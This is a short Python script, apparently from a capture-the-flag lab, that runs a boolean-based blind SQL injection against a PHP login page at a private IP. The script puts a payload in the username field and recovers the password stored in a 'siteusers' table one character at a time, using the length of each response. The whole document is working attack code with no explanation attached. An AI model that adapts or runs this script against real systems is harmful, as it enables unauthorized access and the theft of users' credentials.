import requests, time

url = 'http://10.10.176.148/index.php'
url_logoff = 'http://10.10.176.148/logout.php'
token = {'PHPSESSID':'gip8r7jah1gq3km00cv9m87an4'}
caracteres = ' !"#$%&()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~'
tamanho = 20
senha = ''
tamanho_verdadeiro = 2324

for i in range(1,tamanho + 1):
    for c in caracteres:
        dados = {"username":f"kitty' and ascii(substring((select password from siteusers limit 1),{i},1)) = '{ord(c)}'-- -","password":"fffff"}
        r = requests.post(url, data=dados, cookies=token)
        if len(r.text) == 618:
            print(c)
            senha += c
            requests.get(url_logoff,cookies=token)
            break

print(senha)
